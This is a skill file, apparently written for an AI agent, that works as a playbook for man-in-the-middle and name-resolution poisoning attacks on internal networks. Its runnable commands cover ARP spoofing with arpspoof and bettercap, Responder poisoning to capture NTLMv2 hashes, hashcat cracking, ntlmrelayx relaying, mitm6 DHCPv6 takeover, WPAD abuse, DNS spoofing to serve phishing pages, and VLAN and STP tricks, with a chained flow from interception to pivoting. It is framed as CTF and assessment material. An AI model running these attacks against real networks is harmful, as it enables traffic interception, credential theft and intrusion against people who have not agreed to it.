name: network-protocol
description: Network protocol attack playbook — ARP spoofing, LLMNR/NBT-NS/mDNS poisoning (Responder), WPAD abuse, DHCPv6 takeover, DNS spoofing, and VLAN/STP tricks for MitM positioning. Use on internal-network challenges where you need to capture or redirect traffic on a segment.
---

# Network Protocol Attacks (MitM & Poisoning)

Authorized CTF/assessment use. These attacks put you in the MIDDLE of a segment's traffic or poison its name resolution — the goal is capturing credentials/hashes or redirecting a victim to your host. In CTF this is the bridge to flags on internal hosts.

## 1. ARP spoofing (MitM positioning)

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t VICTIM GATEWAY      # tell victim "I'm the gateway"
arpspoof -i eth0 -t GATEWAY VICTIM      # tell gateway "I'm the victim"
# then sniff (tcpdump/wireshark) or relay
```
Better: `bettercap -iface eth0 -caplet http.proxy` — ARP spoof + sniff in one.

## 2. Name-resolution poisoning (capture hashes)

Broadcast protocols (LLMNR/NBT-NS/mDNS) ask "who has name X?" — answer with YOUR IP, then receive the victim's NTLM hash:
```bash
responder -I eth0          # LLMNR/NBT-NS/mDNS + HTTP/SMB servers → captures NTLMv2 hashes
```
The hashes crack with hashcat (`-m 5600`), or relay them (`ntlmrelayx`) to a host for auth.

## 3. DHCPv6 / WPAD / DNS

- **DHCPv6 takeover (mitm6):** `mitm6 -d domain` — become the IPv6 DNS server → force WPAD → relay NTLM to LDAP/SMB.
- **WPAD abuse:** the victim fetches `wpad.dat` (proxy config) from your responder → all their traffic proxies through you.
- **DNS spoofing:** `ettercap` / `bettercap` `dns.spoof` — answer DNS queries for a domain with your IP (serve a phishing page, capture creds).

## 4. L2 tricks (VLAN/STP)

- **VLAN hopping:** double-tagging (802.1Q inside 802.1Q) or switch-spoofing (DTP) to reach other VLANs.
- **STP manipulation:** become root bridge to capture cross-switch traffic.

## 5. Chain (the standard CTF flow)

1. `bettercap`/`arpspoof` → MitM position.
2. `responder`/`mitm6` → capture NTLM hashes.
3. Crack (hashcat) or relay (`ntlmrelayx`) → account on an internal host.
4. Pivot to the flag host (see multi-stage-pentest-methodology).

## Cross-cutting
- **Position first, then poison** — you need to be on the segment (or the default gateway) before these work.
- **Responder's hashes are the fast win** — LLMNR/NBT-NS poisoning yields credentials without touching the target directly.
- Self-verify: you actually see the victim's traffic/hashes before escalating.
